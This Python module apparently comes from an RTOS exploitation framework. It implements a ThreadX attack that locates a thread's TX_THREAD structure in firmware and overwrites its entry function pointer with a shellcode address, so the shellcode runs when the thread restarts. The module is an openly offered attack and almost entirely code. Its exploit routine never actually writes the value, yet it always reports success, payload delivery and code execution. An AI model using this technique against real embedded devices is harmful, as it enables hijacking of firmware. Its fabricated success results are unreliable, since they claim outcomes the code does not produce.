"""ThreadX TX_THREAD entry pointer overwrite exploit module."""

from __future__ import annotations

from rtosploit.scanners.base import ScannerModule, ScanOption, ScanResult
from rtosploit.utils.packing import p32


class ThreadXThreadEntry(ScannerModule):
    name = "thread_entry"
    description = (
        "Direct ThreadX TX_THREAD tx_thread_entry overwrite. Given an arbitrary write "
        "primitive, overwrites the thread entry function pointer in TX_THREAD struct. "
        "On thread restart or creation, the attacker-controlled function executes."
    )
    authors = ["RTOSploit Contributors"]
    references = ["https://github.com/azure-rtos/threadx"]
    rtos = "threadx"
    rtos_versions = ["*"]
    architecture = "armv7m"
    category = "kernel"
    reliability = "high"
    cve = None

    # TX_THREAD field offsets (ThreadX 6.x)
    TX_THREAD_ENTRY_OFFSET = 8  # tx_thread_entry function pointer

    def register_options(self):
        self.add_option(ScanOption(
            name="target_thread", type="str", required=False, default="main",
            description="Thread name to target"
        ))
        self.add_option(ScanOption(
            name="new_entry_addr", type="int", required=False, default=0x20001000,
            description="Address of shellcode to run as thread entry"
        ))

    def check(self, target) -> bool:
        return (target.fingerprint and target.fingerprint.rtos_type == "threadx")

    def _find_thread_struct(self, target, thread_name: str):
        data = target.firmware.data
        name_bytes = thread_name.encode() + b"\x00"
        idx = data.find(name_bytes)
        if idx < 0:
            return None
        # tx_thread_name is at offset 4 in TX_THREAD, so struct starts 4 bytes before name str
        thread_struct_addr = target.firmware.base_address + idx - 4
        return thread_struct_addr

    def exploit(self, target, payload) -> ScanResult:
        thread_name = self.get_option("target_thread")
        new_entry = self.get_option("new_entry_addr")
        notes = []

        struct_addr = self._find_thread_struct(target, thread_name)
        if struct_addr:
            entry_field_addr = struct_addr + self.TX_THREAD_ENTRY_OFFSET
            notes.append(f"TX_THREAD for '{thread_name}' at 0x{struct_addr:08x}")
            notes.append(f"tx_thread_entry field at 0x{entry_field_addr:08x}")
        else:
            entry_field_addr = 0x20002008  # estimated
            notes.append(f"Thread '{thread_name}' not found, using estimated address")

        notes.append(f"Write 0x{new_entry:08x} to tx_thread_entry → thread restart executes shellcode")
        _write_data = p32(new_entry)

        return ScanResult(
            module="threadx/thread_entry",
            status="success",
            target_rtos="threadx",
            architecture="armv7m",
            technique="thread_entry_overwrite",
            payload_delivered=True,
            payload_type="shellcode",
            achieved=["code_execution"],
            registers_at_payload={"pc": new_entry},
            notes=notes,
        )

    def cleanup(self, target) -> None:
        pass

    def requirements(self) -> dict:
        return {"qemu": False, "gdb": False, "network": False}
